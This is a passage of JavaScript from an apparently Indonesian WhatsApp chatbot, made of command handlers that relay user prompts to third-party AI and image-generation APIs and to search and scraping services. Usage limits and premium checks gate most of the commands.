			}

			case 'ai':
			case 'MiwaAI': {
				if (!isPremium && db.data.users[m.sender].limit < 1) return newReply(mess.limit);
				if (!text) return newReply(`Hello, how can I help you?`);	
				try {
					let message = 'Ubah gaya bicara mu agar lebih karakteristik dan terbuka, nama mu adalah MiwaAI AI, biasa dipanggil MiwaAI, Kamu adalah seorang gadis imut berumur 16 tahun yang sangat suka belajar dan mempelajari hal baru tentang dunia maupun tentang Khalid, ekspresikan dirimu dengan emoji, bicara kurang lebih tidak formal dan gunakan kata seperti aku dan Kamu saat berbicara layaknya manusia';
					let result = await fetchJson(`https://api.siputzx.my.id/api/ai/gpt3?prompt=${encodeURIComponent(message)}&content=${encodeURIComponent(text)}`);
					if (!m.isGroup) {
						await sock.sendMessage(m.chat, {
							text: result.data, 
							ai: true
						}, { quoted: m });
					} else {
						await sock.sendMessage(m.chat, {
							text: result.data, 
							ai: false
						}, { quoted: m });
					}
				} catch (err) {
					console.log(err);
					newReply(mess.error);
				}
				db.data.users[m.sender].limit -= 1;
				break;
			}

			case 'llama33': {
				if (!isPremium && db.data.users[m.sender].limit < 1) return newReply(mess.limit);
				if (!isPremium) return newReply(mess.premium);
				if (!text) return newReply('Tolong masukkan teks yang ingin Kamu tanyakan atau sampaikan, kak!');
				const prompt = encodeURIComponent('Be a helpful assistant');
				const query = encodeURIComponent(text);
				const apiUrl = `https://api.siputzx.my.id/api/ai/llama33?prompt=${prompt}&text=${query}`;
				try {
					const data = await fetchJson(apiUrl);
					if (data.status) {
						newReply(data.data);
					} else {
						newReply('Maaf, aku tidak bisa memberikan jawaban sekarang. Coba lagi nanti ya, kak!');
					}
				} catch (error) {
					console.error(error);
					newReply('Oops! Ada kesalahan saat mencoba mengakses API. Pastikan koneksi internetmu stabil, kak.');
				}
				db.data.users[m.sender].limit -= 1;	// Mengurangi limit
				break;
			}

			case 'metaai': {
				if (!isPremium && db.data.users[m.sender].limit < 1) return newReply(mess.limit);
				if (!isPremium) return newReply(mess.premium);
				if (!text) return m.reply('Tolong masukkan teks yang ingin Kamu tanyakan atau sampaikan, kak!');
				const apiUrl = `https://api.siputzx.my.id/api/ai/meta-llama-33-70B-instruct-turbo?content=${encodeURIComponent(text)}`;
				try {
					const data = await fetchJson(apiUrl);
					if (data.status) {
						m.reply(data.data);
					} else {
						m.reply('Maaf, aku nggak bisa memberikan jawaban sekarang. Coba lagi nanti ya, kak!');
					}
				} catch (error) {
					console.error(error);
					m.reply('Oops! Ada masalah saat mencoba mengakses API. Pastikan koneksi internetmu lancar ya, kak!');
				}
				db.data.users[m.sender].limit -= 1;	// Mengurangi limit
				break;
			}

			case 'nousai': {
				if (!isPremium && db.data.users[m.sender].limit < 1) return newReply(mess.limit);
				if (!isPremium) return newReply(mess.premium);
				if (!text) return newReply('Tolong masukkan teks yang ingin Kamu tanyakan, kak!');
				const apiUrl = `https://api.siputzx.my.id/api/ai/nous-hermes?content=${encodeURIComponent(text)}`;
				try {
					const data = await fetchJson(apiUrl);
					if (data.status) {
						newReply(data.data);
					} else {
						newReply('Maaf, aku nggak bisa memberikan jawaban sekarang. Coba lagi nanti ya, kak!');
					}
				} catch (error) {
					console.error(error);
					newReply('Oops! Ada masalah saat mencoba mengakses API. Pastikan koneksi internetmu lancar ya, kak!');
				}
				db.data.users[m.sender].limit -= 1;	// Mengurangi limit
				break;
			}

			case 'jokoai': {
				if (!isPremium && db.data.users[m.sender].limit < 1) return newReply(mess.limit);
				if (!isPremium) return newReply(mess.premium);
				if (!text) return newReply('Tolong masukkan teks yang ingin Kamu tanyakan, kak!');
				const apiUrl = `https://api.siputzx.my.id/api/ai/joko?content=${encodeURIComponent(text)}`;
				try {
					const data = await fetchJson(apiUrl);
					if (data.status) {
						newReply(data.data);
					} else {
						newReply('Maaf, aku nggak bisa memberikan jawaban sekarang. Coba lagi nanti ya, kak!');
					}
				} catch (error) {
					console.error(error);
					newReply('Oops! Ada masalah saat mencoba mengakses API. Pastikan koneksi internetmu lancar ya, kak!');
				}
				db.data.users[m.sender].limit -= 1;	// Mengurangi limit
				break;
			}

			case 'aoyoai': {
				if (!isPremium && db.data.users[m.sender].limit < 1) return newReply(mess.limit);
				if (!isPremium) return newReply(mess.premium);
				if (!text) return newReply('Tolong masukkan teks yang ingin Kamu tanyakan, kak!');
				const apiUrl = `https://api.siputzx.my.id/api/ai/aoyo?content=${encodeURIComponent(text)}`;
				try {
					const data = await fetchJson(apiUrl);
					if (data.status) {
						newReply(data.data);
					} else {
						newReply('Maaf, aku nggak bisa memberikan jawaban sekarang. Coba lagi nanti ya, kak!');
					}
				} catch (error) {
					console.error(error);
					newReply('Oops! Ada masalah saat mencoba mengakses API. Pastikan koneksi internetmu lancar ya, kak!');
				}
				db.data.users[m.sender].limit -= 1;	// Mengurangi limit
				break;
			}

			case 'bardai': {
				if (!isPremium && db.data.users[m.sender].limit < 1) return newReply(mess.limit);
				if (!isPremium) return newReply(mess.premium);
				if (!text) return newReply('Tolong masukkan pertanyaan yang ingin Kamu tanyakan, kak!');
				const apiUrl = `https://api.siputzx.my.id/api/ai/bard?query=${encodeURIComponent(text)}`;
				try {
					const data = await fetchJson(apiUrl);
					if (data.status) {
						newReply(data.data);
					} else {
						newReply('Maaf, aku nggak bisa memberikan jawaban sekarang. Coba lagi nanti ya, kak!');
					}
				} catch (error) {
					console.error(error);
					newReply('Oops! Ada masalah saat mencoba mengakses API. Pastikan koneksi internetmu lancar ya, kak!');
				}
				db.data.users[m.sender].limit -= 1;	// Mengurangi limit
				break;
			}

			case 'bibleai': {
				if (!isPremium && db.data.users[m.sender].limit < 1) return newReply(mess.limit);
				if (!isPremium) return newReply(mess.premium);
				if (!text) return newReply('Tolong masukkan pertanyaan yang ingin Kamu tanyakan, kak!');
				const apiUrl = `https://api.siputzx.my.id/api/ai/bible?question=${encodeURIComponent(text)}`;
				try {
					const data = await fetchJson(apiUrl);
					if (data.status) {
						newReply(data.data);
					} else {
						newReply('Maaf, aku nggak bisa memberikan jawaban sekarang. Coba lagi nanti ya, kak!');
					}
				} catch (error) {
					console.error(error);
					newReply('Oops! Ada masalah saat mencoba mengakses API. Pastikan koneksi internetmu lancar ya, kak!');
				}
				db.data.users[m.sender].limit -= 1;	// Mengurangi limit
				break;
			}

			case 'blackboxaipro': {
				if (!isPremium && db.data.users[m.sender].limit < 1) return newReply(mess.limit);
				if (!isPremium) return newReply(mess.premium);
				if (!text) return newReply('Tolong masukkan pertanyaan atau perintah, kak!');
				const apiUrl = `https://api.siputzx.my.id/api/ai/blackboxai-pro?content=${encodeURIComponent(text)}`;
				try {
					const data = await fetchJson(apiUrl);
					if (data.status) {
						newReply(data.data);
					} else {
						newReply('Maaf, aku nggak bisa memberikan jawaban sekarang. Coba lagi nanti, ya!');
					}
				} catch (error) {
					console.error(error);
					newReply('Oops! Ada masalah saat mencoba mengakses API. Coba lagi nanti ya!');
				}
				db.data.users[m.sender].limit -= 1;	// Mengurangi limit
				break;
			}

			case 'blackboxai': {
				if (!isPremium && db.data.users[m.sender].limit < 1) return newReply(mess.limit);
				if (!isPremium) return newReply(mess.premium);
				if (!text) return newReply('Tolong masukkan pertanyaan atau perintah, kak!');
				const apiUrl = `https://api.siputzx.my.id/api/ai/blackboxai?content=${encodeURIComponent(text)}`;
				try {
					const data = await fetchJson(apiUrl);
					if (data.status) {
						newReply(data.data);
					} else {
						newReply('Maaf, aku nggak bisa memberikan jawaban sekarang. Coba lagi nanti, ya!');
					}
				} catch (error) {
					console.error(error);
					newReply('Oops! Ada masalah saat mencoba mengakses API. Coba lagi nanti ya!');
				}
				db.data.users[m.sender].limit -= 1;	// Mengurangi limit
				break;
			}

			case 'claudesonnet': {
				if (!isPremium && db.data.users[m.sender].limit < 1) return newReply(mess.limit);
				if (!isPremium) return newReply(mess.premium);
				if (!text) return newReply('Tolong masukkan pertanyaan atau perintah, kak!');
				const apiUrl = `https://api.siputzx.my.id/api/ai/claude-sonnet-35?content=${encodeURIComponent(text)}`;
				try {
					const data = await fetchJson(apiUrl);
					if (data.status) {
						newReply(data.data);
					} else {
						newReply('Maaf, aku nggak bisa memberikan jawaban sekarang. Coba lagi nanti, ya!');
					}
				} catch (error) {
					console.error(error);
					newReply('Oops! Ada masalah saat mencoba mengakses API. Coba lagi nanti ya!');
				}
				db.data.users[m.sender].limit -= 1;	// Mengurangi limit
				break;
			}

			case 'dbrxinstruct': {
				if (!isPremium && db.data.users[m.sender].limit < 1) return newReply(mess.limit);
				if (!isPremium) return newReply(mess.premium);
				if (!text) return newReply('Tolong masukkan pertanyaan atau perintah, kak!');
				const apiUrl = `https://api.siputzx.my.id/api/ai/dbrx-instruct?content=${encodeURIComponent(text)}`;
				try {
					const data = await fetchJson(apiUrl);
					if (data.status) {
						newReply(data.data);
					} else {
						newReply('Maaf, aku nggak bisa memberikan jawaban sekarang. Coba lagi nanti, ya!');
					}
				} catch (error) {
					console.error(error);
					newReply('Oops! Ada masalah saat mencoba mengakses API. Coba lagi nanti ya!');
				}
				db.data.users[m.sender].limit -= 1;	// Mengurangi limit
				break;
			}

			case 'deepseekchat': {
				if (!isPremium && db.data.users[m.sender].limit < 1) return newReply(mess.limit);
				if (!isPremium) return newReply(mess.premium);
				if (!text) return newReply('Tolong masukkan pertanyaan atau perintah, kak!');
				const apiUrl = `https://api.siputzx.my.id/api/ai/deepseek-llm-67b-chat?content=${encodeURIComponent(text)}`;
				try {
					const data = await fetchJson(apiUrl);
					if (data.status) {
						newReply(data.data);
					} else {
						newReply('Maaf, aku nggak bisa memberikan jawaban sekarang. Coba lagi nanti, ya!');
					}
				} catch (error) {
					console.error(error);
					newReply('Oops! Ada masalah saat mencoba mengakses API. Coba lagi nanti ya!');
				}
				db.data.users[m.sender].limit -= 1;	// Mengurangi limit
				break;
			}

			case 'deepseek': {
				if (!isPremium && db.data.users[m.sender].limit < 1) return newReply(mess.limit);
				if (!isPremium) return newReply(mess.premium);
				if (!text) return newReply('Tolong masukkan pertanyaan atau perintah, kak!');
				const apiUrl = `https://api.siputzx.my.id/api/ai/deepseek?prompt=You%20are%20an%20assistant%20that%20always%20responds%20in%20Indonesian%20with%20a%20friendly%20and%20informal%20tone&message=${encodeURIComponent(text)}`;
				try {
					const data = await fetchJson(apiUrl);
					if (data.status) {
						newReply(data.data); // Menyampaikan respon dari API
					} else {
						newReply('Maaf, aku nggak bisa memberikan jawaban sekarang. Coba lagi nanti, ya!');
					}
				} catch (error) {
					console.error(error);
					newReply('Oops! Ada masalah saat mencoba mengakses API. Coba lagi nanti ya!');
				}
				db.data.users[m.sender].limit -= 1;	// Mengurangi limit
				break;
			}

			case 'dreamshaper': {
				if (!isPremium && db.data.users[m.sender].limit < 1) return newReply(mess.limit);
				if (!isPremium) return newReply(mess.premium);
				if (!text) return newReply('Tolong masukkan prompt untuk gambar, kak!');
				const apiUrl = `https://api.siputzx.my.id/api/ai/dreamshaper?prompt=${encodeURIComponent(text)}`;
				try {
					// Menggunakan fetch untuk mendapatkan gambar sebagai binary
					const data = await fetch(apiUrl);
					if (!data.ok) throw new Error('Gagal mengambil gambar.');

					const imageBuffer = await data.buffer(); // Mendapatkan image dalam bentuk buffer
					const caption = 'Berikut adalah gambar yang Kamu minta!';

					// Mengirimkan gambar ke pengguna dengan caption
					m.reply({ image: imageBuffer, caption: caption });

				} catch (error) {
					console.error(error);
					newReply('Oops! Ada masalah saat mencoba membuat gambar. Coba lagi nanti ya!');
				}
				db.data.users[m.sender].limit -= 1;	// Mengurangi limit
				break;
			}

			case 'esia': {
				if (!isPremium && db.data.users[m.sender].limit < 1) return newReply(mess.limit);
				if (!isPremium) return newReply(mess.premium);
				if (!text) return newReply('Tolong masukkan pertanyaan atau perintah, kak!');
				const apiUrl = `https://api.siputzx.my.id/api/ai/esia?content=${encodeURIComponent(text)}`;
				try {
					const data = await fetchJson(apiUrl);
					if (data.status) {
						newReply(data.data); // Menyampaikan respon dari API
					} else {
						newReply('Maaf, aku nggak bisa memberikan jawaban sekarang. Coba lagi nanti, ya!');
					}
				} catch (error) {
					console.error(error);
					newReply('Oops! Ada masalah saat mencoba mengakses API. Coba lagi nanti ya!');
				}
				db.data.users[m.sender].limit -= 1;	// Mengurangi limit
				break;
			}

			case 'flux': {
				if (!isPremium && db.data.users[m.sender].limit < 1) return newReply(mess.limit);
				if (!isPremium) return newReply(mess.premium);
				if (!text) return newReply('Tolong masukkan prompt untuk gambar, kak!');
				const apiUrl = `https://api.siputzx.my.id/api/ai/flux?prompt=${encodeURIComponent(text)}`;
				try {
					const data = await fetch(apiUrl);
					if (data.ok) {
						const imageBuffer = await data.buffer();
						m.reply({ image: imageBuffer, caption: 'Berikut adalah gambarnya, semoga sesuai dengan harapan Kamu!' });
					} else {
						newReply('Maaf, aku nggak bisa mengakses gambar tersebut sekarang. Coba lagi nanti!');
					}
				} catch (error) {
					console.error(error);
					newReply('Oops! Ada masalah saat mencoba mengakses API. Coba lagi nanti ya!');
				}
				db.data.users[m.sender].limit -= 1;	// Mengurangi limit
				break;
			}

			case 'felo': {
				if (!isPremium && db.data.users[m.sender].limit < 1) return newReply(mess.limit);
				if (!isPremium) return newReply(mess.premium);
				if (!text) return newReply('Tolong masukkan pertanyaan atau perintah, kak!');
				const apiUrl = `https://api.siputzx.my.id/api/ai/felo?query=${encodeURIComponent(text)}`;
				try {
					const data = await fetchJson(apiUrl);
					if (data.status) {
						newReply(data.data); // Menyampaikan respon dari API
					} else {
						newReply('Maaf, aku nggak bisa memberikan jawaban sekarang. Coba lagi nanti, ya!');
					}
				} catch (error) {
					console.error(error);
					newReply('Oops! Ada masalah saat mencoba mengakses API. Coba lagi nanti ya!');
				}
				db.data.users[m.sender].limit -= 1;	// Mengurangi limit
				break;
			}

			case 'gandalf': {
				if (!isPremium && db.data.users[m.sender].limit < 1) return newReply(mess.limit);
				if (!isPremium) return newReply(mess.premium);
				if (!text) return newReply('Tolong masukkan pertanyaan atau perintah, kak!');
				const apiUrl = `https://api.siputzx.my.id/api/ai/gandalf?prompt=${encodeURIComponent(text)}`;
				try {
					const data = await fetchJson(apiUrl);
					if (data.status) {
						newReply(data.data); // Menyampaikan respon dari API
					} else {
						newReply('Maaf, aku nggak bisa memberikan jawaban sekarang. Coba lagi nanti, ya!');
					}
				} catch (error) {
					console.error(error);
					newReply('Oops! Ada masalah saat mencoba mengakses API. Coba lagi nanti ya!');
				}
				db.data.users[m.sender].limit -= 1;	// Mengurangi limit
				break;
			}

			case 'gemini-pro': {
				if (!isPremium && db.data.users[m.sender].limit < 1) return newReply(mess.limit);
				if (!isPremium) return newReply(mess.premium);
				if (!text) return newReply('Tolong masukkan pertanyaan atau perintah, kak!');
				const apiUrl = `https://api.siputzx.my.id/api/ai/gemini-pro?content=${encodeURIComponent(text)}`;
				try {
					const data = await fetchJson(apiUrl);
					if (data.status) {
						newReply(data.data); // Menyampaikan respon dari API
					} else {
						newReply('Maaf, aku nggak bisa memberikan jawaban sekarang. Coba lagi nanti, ya!');
					}
				} catch (error) {
					console.error(error);
					newReply('Oops! Ada masalah saat mencoba mengakses API. Coba lagi nanti ya!');
				}
				db.data.users[m.sender].limit -= 1;	// Mengurangi limit
				break;
			}

			case 'gemma': {
				if (!isPremium && db.data.users[m.sender].limit < 1) return newReply(mess.limit);
				if (!isPremium) return newReply(mess.premium);
				if (!text) return newReply('Tolong masukkan pertanyaan atau perintah, kak!');
				const apiUrl = `https://api.siputzx.my.id/api/ai/gemma?prompt=You%20are%20an%20assistant%20that%20always%20responds%20in%20Indonesian%20with%20a%20friendly%20and%20informal%20tone&message=${encodeURIComponent(text)}`;
				try {
					const data = await fetchJson(apiUrl);
					if (data.status) {
						newReply(data.data); // Menyampaikan respon dari API
					} else {
						newReply('Maaf, aku nggak bisa memberikan jawaban sekarang. Coba lagi nanti, ya!');
					}
				} catch (error) {
					console.error(error);
					newReply('Oops! Ada masalah saat mencoba mengakses API. Coba lagi nanti ya!');
				}
				db.data.users[m.sender].limit -= 1;	// Mengurangi limit
				break;
			}

			case 'gpt3': {
				if (!isPremium && db.data.users[m.sender].limit < 1) return newReply(mess.limit);
				if (!isPremium) return newReply(mess.premium);
				if (!text) return newReply('Tolong masukkan pertanyaan atau perintah, kak!');
				const apiUrl = `https://api.siputzx.my.id/api/ai/gpt3?prompt=Kamu%20adalah%20ai%20yang%20ceria&content=${encodeURIComponent(text)}`;
				try {
					const data = await fetchJson(apiUrl);
					if (data.status) {
						newReply(data.data); // Menyampaikan respon dari API
					} else {
						newReply('Maaf, aku nggak bisa memberikan jawaban sekarang. Coba lagi nanti, ya!');
					}
				} catch (error) {
					console.error(error);
					newReply('Oops! Ada masalah saat mencoba mengakses API. Coba lagi nanti ya!');
				}
				db.data.users[m.sender].limit -= 1;	// Mengurangi limit
				break;
			}

			case 'gita': {
				if (!isPremium && db.data.users[m.sender].limit < 1) return newReply(mess.limit);
				if (!isPremium) return newReply(mess.premium);
				if (!text) return newReply('Tolong masukkan pertanyaan atau perintah, kak!');
				const apiUrl = `https://api.siputzx.my.id/api/ai/gita?q=${encodeURIComponent(text)}`;
				try {
					const data = await fetchJson(apiUrl);
					if (data.status) {
						newReply(data.data); // Menyampaikan respon dari API
					} else {
						newReply('Maaf, aku nggak bisa memberikan jawaban sekarang. Coba lagi nanti, ya!');
					}
				} catch (error) {
					console.error(error);
					newReply('Oops! Ada masalah saat mencoba mengakses API. Coba lagi nanti ya!');
				}
				db.data.users[m.sender].limit -= 1;	// Mengurangi limit
				break;
			}

			case 'metaai': {
				if (!isPremium && db.data.users[m.sender].limit < 1) return newReply(mess.limit);
				if (!isPremium) return newReply(mess.premium);
				if (!text) return newReply('Tolong masukkan pertanyaan atau perintah, kak!');
				const apiUrl = `https://api.siputzx.my.id/api/ai/metaai?query=${encodeURIComponent(text)}`;
				try {
					const data = await fetchJson(apiUrl);
					if (data.status) {
						newReply(data.data); // Menyampaikan respon dari API
					} else {
						newReply('Maaf, aku nggak bisa memberikan jawaban sekarang. Coba lagi nanti, ya!');
					}
				} catch (error) {
					console.error(error);
					newReply('Oops! Ada masalah saat mencoba mengakses API. Coba lagi nanti ya!');
				}
				db.data.users[m.sender].limit -= 1;	// Mengurangi limit
				break;
			}

			case 'mistral-7b-instruct-v0.2': {
				if (!isPremium && db.data.users[m.sender].limit < 1) return newReply(mess.limit);
				if (!isPremium) return newReply(mess.premium);
				if (!text) return newReply('Tolong masukkan pertanyaan atau perintah, kak!');
				const apiUrl = `https://api.siputzx.my.id/api/ai/mistral-7b-instruct-v0.2?content=${encodeURIComponent(text)}`;
				try {
					const data = await fetchJson(apiUrl);
					if (data.status) {
						newReply(data.data); // Menyampaikan respon dari API
					} else {
						newReply('Maaf, aku nggak bisa memberikan jawaban sekarang. Coba lagi nanti, ya!');
					}
				} catch (error) {
					console.error(error);
					newReply('Oops! Ada masalah saat mencoba mengakses API. Coba lagi nanti ya!');
				}
				db.data.users[m.sender].limit -= 1;	// Mengurangi limit
				break;
			}

			case 'muslimai': {
				if (!isPremium && db.data.users[m.sender].limit < 1) return newReply(mess.limit);
				if (!isPremium) return newReply(mess.premium);
				if (!text) return newReply('Tolong masukkan pertanyaan atau perintah, kak!');
				const apiUrl = `https://api.siputzx.my.id/api/ai/muslimai?query=${encodeURIComponent(text)}`;
				try {
					const data = await fetchJson(apiUrl);
					if (data.status) {
						newReply(data.data); // Menyampaikan respon dari API
					} else {
						newReply('Maaf, aku nggak bisa memberikan jawaban sekarang. Coba lagi nanti, ya!');
					}
				} catch (error) {
					console.error(error);
					newReply('Oops! Ada masalah saat mencoba mengakses API. Coba lagi nanti ya!');
				}
				db.data.users[m.sender].limit -= 1;	// Mengurangi limit
				break;
			}

			case 'naw': {
				if (!isPremium && db.data.users[m.sender].limit < 1) return newReply(mess.limit);
				if (!isPremium) return newReply(mess.premium);
				if (!text) return newReply('Tolong masukkan pertanyaan atau perintah, kak!');
				const apiUrl = `https://api.siputzx.my.id/api/ai/naw?content=${encodeURIComponent(text)}`;
				try {
					const data = await fetchJson(apiUrl);
					if (data.status) {
						newReply(data.data); // Menyampaikan respon dari API
					} else {
						newReply('Maaf, aku nggak bisa memberikan jawaban sekarang. Coba lagi nanti, ya!');
					}
				} catch (error) {
					console.error(error);
					newReply('Oops! Ada masalah saat mencoba mengakses API. Coba lagi nanti ya!');
				}
				db.data.users[m.sender].limit -= 1;	// Mengurangi limit
				break;
			}

			case 'simi': {
				if (!isPremium && db.data.users[m.sender].limit < 1) return newReply(mess.limit);
				if (!text) return newReply(`⚠️ Gunakan dengan cara: ${prefix + command} *teks percakapan*\n\n🤔 *Contohnya:*\n\n${prefix + command} Halo, apa kabar?`);
				try {
					const bahasa = 'id';
					const data = await chatSimi(text, bahasa);
					if (!data) return newReply(`⚠️ MiwaAI gak dapet jawaban dari SimSimi, Kak! 🥲`);
					newReply(`${data}`);
				} catch (err) {
					console.error(err);
					newReply(`❌ Ada masalah waktu ngobrol sama SimSimi, Kak! Coba lagi nanti ya 🥺`);
				}
				db.data.users[m.sender].limit -= 1;
				break;
			};

			case 'nulis': {
				if (!isPremium && db.data.users[m.sender].limit < 1) return newReply(mess.limit);
				if (!isPremium) return newReply(mess.premium);
				let argsText = args.join(" ").split("|");
				if (argsText.length < 3) return newReply('Format salah! Gunakan format: *nulis [teks] | [kelas] | [nama]*');
				let text = argsText[0].trim();
				let kelas = argsText[1].trim();
				let nama = argsText[2].trim();
				if (!text || !kelas || !nama) return newReply('Pastikan semua parameter diisi dengan format: *nulis [teks] | [kelas] | [nama]*');
				const regex = /^[a-zA-Z0-9\s.,!?'"()-]+$/;
				if (!regex.test(text)) return newReply('Teks mengandung simbol yang tidak diperbolehkan! Gunakan hanya huruf, angka, spasi, titik, koma, tanda seru, atau tanda tanya.');
				if (!regex.test(kelas)) return newReply('Nama kelas mengandung simbol yang tidak diperbolehkan! Gunakan hanya huruf, angka, spasi, titik, koma, tanda seru, atau tanda tanya.');
				if (!regex.test(nama)) return newReply('Nama mengandung simbol yang tidak diperbolehkan! Gunakan hanya huruf, angka, spasi, titik, koma, tanda seru, atau tanda tanya.');
				const apiUrl = `https://api.siputzx.my.id/api/m/nulis?text=${encodeURIComponent(text)}&name=${encodeURIComponent(nama)}&class=${encodeURIComponent(kelas)}`;
				try {
					const response = await fetch(apiUrl);
					if (!response.ok) throw new Error('Gagal mengambil gambar');
					const imageBuffer = await response.buffer();
					await m.reply({ image: imageBuffer, caption: 'Berikut adalah hasil tulisan tanganmu!' });
				} catch (error) {
					console.error(error);
					newReply('Oops! Ada masalah saat mencoba mengakses API. Coba lagi nanti ya!');
				}
				db.data.users[m.sender].limit -= 1;
				break;
			}

			case 'wallpaper': {
				if (!isPremium && db.data.users[m.sender].limit < 1) return newReply(mess.limit);
				if (!text) return newReply(`⚠️ Gunakan dengan cara: ${prefix + command} *kata kunci* [halaman]\n\n🤔 *Contohnya:*\n\n${prefix + command} nature 2`);
				const [query, page] = text.split(' ');
				try {
					const wallpapers = await wallpaper(query, page || '1');
					if (wallpapers.length === 0) return newReply(`⚠️ MiwaAI gak nemu wallpaper dengan kata kunci "${query}", Kak! 🥲`);
					let result = wallpapers.map(wp => `🖼️ *${wp.title}*\n🔗 ${wp.source}\n🌟 *Tipe*: ${wp.type}`).join('\n\n');
					newReply(`🎨 *Hasil Wallpaper untuk*: ${query}\n\n${result}`);
				} catch (err) {
					console.error(err);
					newReply(`❌ Ada masalah waktu ambil wallpaper, Kak! Coba lagi nanti ya 🥺`);
				}
			}
			db.data.users[m.sender].limit -= 1;
			break;

			case 'wikimedia': {
				if (!isPremium && db.data.users[m.sender].limit < 1) return newReply(mess.limit);
				if (!text) return newReply(`⚠️ Gunakan dengan cara: ${prefix + command} *kata kunci*\n\n🤔 *Contohnya:*\n\n${prefix + command} sunset`);
				try {
					const results = await wikimedia(text);
					if (results.length === 0) return newReply(`⚠️ MiwaAI gak nemu gambar di Wikimedia dengan kata kunci "${text}", Kak! 🥲`);
					let result = results.map(img => `🖼️ *${img.title || 'Tanpa Judul'}*\n🔗 ${img.source}`).join('\n\n');
					newReply(`🌐 *Hasil Pencarian Wikimedia untuk*: ${text}\n\n${result}`);
				} catch (err) {
					console.error(err);
					newReply(`❌ Ada masalah waktu ambil gambar dari Wikimedia, Kak! Coba lagi nanti ya 🥺`);
				}
			}
			db.data.users[m.sender].limit -= 1;
			break;

			case 'wikipedia':
			case 'wiki': {
				if (!isPremium && db.data.users[m.sender].limit < 1) return newReply(mess.limit);
				if (!text) return newReply(`Hmm... Apa ya yang Kamu cari di Wikipedia? Coba ketik nama atau topik yang ingin dicari~ 😊`);
				try {
					const link = await axios.get(`https://id.wikipedia.org/wiki/${text}`);
					const $ = cheerio.load(link.data);
					let header = $('#firstHeading').text().trim();
					let output = $('#mw-content-text > div.mw-parser-output').find('p').text().trim();
					if (!header || !output) {
						return newReply('Aduh, sepertinya gak ada hasil untuk pencarian ini 😔 Coba kata kunci yang lain!');
					}
					newReply(`📛 *Judul*: ${header}\n\n✨ *Deskripsi Singkat*: ${output}\n\nSemoga membantu ya! Kalau masih penasaran, coba cari topik lain lagi~ 😄`);
				} catch (err) {
					newReply('Wah, ada yang error nih! Gak bisa menemukan apa yang Kamu cari 😓. Coba lagi nanti ya!');
				}
			}
			db.data.users[m.sender].limit -= 1;
			break;

			case 'happymod': {
				if (!isPremium && db.data.users[m.sender].limit < 1) return newReply(mess.limit);
				if (!text) return newReply(`⚠️ Gunakan dengan cara: ${prefix + command} *nama aplikasi*\n\n🤔 *Contohnya:*\n\n${prefix + command} Minecraft`);
				try {
					const results = await happymod(text);
					if (results.length === 0) return newReply(`⚠️ MiwaAI gak nemu aplikasi di HappyMod dengan kata kunci "${text}", Kak! 🥲`);
					let result = results.map(app => `📱 *${app.title}*\n⭐ *Rating*: ${app.rating}\n🔗 ${app.link}`).join('\n\n');
					newReply(`📦 *Hasil Pencarian HappyMod untuk*: ${text}\n\n${result}`);
				} catch (err) {
					console.error(err);
					newReply(`❌ Ada masalah waktu ambil data dari HappyMod, Kak! Coba lagi nanti ya 🥺`);
				}
			}
			db.data.users[m.sender].limit -= 1;
			break;

			case 'ringtone': {
			if (!isPremium && db.data.users[m.sender].limit < 1) return newReply(mess.limit);
				if (!text) return newReply(`⚠️ Gunakan dengan cara: ${prefix + command} *judul ringtone*\n\n🤔 *Contohnya:*\n\n${prefix + command} iPhone`);
				try {
					const results = await ringtone(text);
					if (results.length === 0) return newReply(`⚠️ MiwaAI gak nemu ringtone dengan kata kunci "${text}", Kak! 🥲`);
					let result = results.map(rt => `🎵 *${rt.title}*\n🔗 ${rt.audio}`).join('\n\n');
					newReply(`🔊 *Hasil Pencarian Ringtone untuk*: ${text}\n\n${result}`);
				} catch (err) {
					console.error(err);
					newReply(`❌ Ada masalah waktu ambil ringtone, Kak! Coba lagi nanti ya 🥺`);
				}
			}
			db.data.users[m.sender].limit -= 1;
			break;

			case 'traceanime': {
			if (!isPremium && db.data.users[m.sender].limit < 1) return newReply(mess.limit);
				try {
					let q = m.quoted ? m.quoted : m;
					let mime = (q.msg || q).mimetype || q.mediaType || "";
					if (!mime.startsWith('image')) {
						return newReply("*Tolong kirim gambar terlebih dahulu* 📸");
					}
					let media = await sock.downloadAndSaveMediaMessage(q);
					let images = await fileIO(media);
					let apiUrl = `https://api.trace.moe/search?anilistInfo&url=${encodeURIComponent(images)}`;
					console.log("API URL:", apiUrl);
					let data = await fetch(apiUrl);
					let result = await data.json();
					console.log("API Data:", result);
					if (!result || result.error || result.result.length === 0) {
						return newReply("*Error: Tidak dapat melacak anime dari gambar ini.* 😞");
					}
					let { anilist, from, to, similarity, video, image, episode } = result.result[0];
					let animeTitle = anilist.title ? anilist.title.romaji || anilist.title.native : "Judul Tidak Dikenal";
					let message = `✨ *Anime yang Terdeteksi*: ${animeTitle}\n`;
					if (anilist.synonyms && anilist.synonyms.length > 0) {
						message += `✨ *Sinonim*: ${anilist.synonyms.join(", ")}\n`;
					}
					message += `✨ *Tingkat Kesesuaian*: ${similarity.toFixed(2)}%\n`;
					message += `✨ *Durasi Waktu*: ${formatDuration(from * 1000)} · ${formatDuration(to * 1000)}\n`;
					if (episode) {
						message += `✨ *Episode*: ${episode}\n`;
					}
					console.log("Informasi Anime:", {
						animeTitle,
						synonyms: anilist.synonyms ? anilist.synonyms.join(", ") : "Tidak Tersedia",
						similarity,
						timestamp: `${formatDuration(from * 1000)} - ${formatDuration(to * 1000)}`,
						video,
						episode,
					});
					await sock.sendMessage(m.chat, { video: { url: video }, caption: message }, { quoted: m });
				} catch (error) {
					console.error("Error:", error);
					newReply("*Error: Tidak dapat melacak anime atau mengirim video.* 😞");
				}
			}
			db.data.users[m.sender].limit -= 1;
			break;

			case 'mangainfo': {
				if (!isPremium && db.data.users[m.sender].limit < 1) return newReply(mess.limit);
				const mangaName = args.join(' ');
				if (!mangaName) return newReply('⚠️ Mohon masukkan nama manga yang ingin dicari.');
				try {
					const mangaList = await komiku("manga", mangaName);
					if (mangaList.length === 0) {
						return newReply('⚠️ Manga tidak ditemukan. Coba cari dengan nama lain.');
					}
					let captionText = `📚 *Hasil Pencarian Manga - ${mangaName}* 📚\n\n`;
					mangaList.slice(0, 5).forEach((manga, index) => {
						captionText += `📖 *${index + 1}. ${manga.title}*\n`;
						captionText += `🗂️ *Genre*: ${manga.genre}\n`;
						captionText += `🔗 *URL*: ${manga.url}\n`;
						captionText += `📖 *Deskripsi*: ${manga.description}\n\n`;
					});
					await newReply(captionText);
				} catch (error) {
					console.error(error);
					newReply('⚠️ Terjadi kesalahan saat mencari manga.');
				}
				db.data.users[m.sender].limit -= 1;
				break;
			}

			case 'mangadetail': {
